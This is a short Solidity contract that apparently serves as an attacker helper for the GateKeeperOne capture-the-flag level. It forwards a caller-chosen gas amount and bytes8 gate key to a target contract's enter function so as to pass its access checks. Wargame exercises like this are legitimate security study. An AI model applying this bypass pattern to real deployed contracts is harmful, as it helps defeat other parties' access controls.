// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

contract EnterGateKeeperOne {
    bytes public returnedData;

    address public gateKeeperOneAddress;

    constructor(address _gateKeeperOneAddress) {
        gateKeeperOneAddress = _gateKeeperOneAddress;
    }

    function youShallPass(uint256 _gas, bytes8 _gateKey) public {
        (bool success,) = gateKeeperOneAddress.call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        if (!success) {
            revert();
        }
    }
}
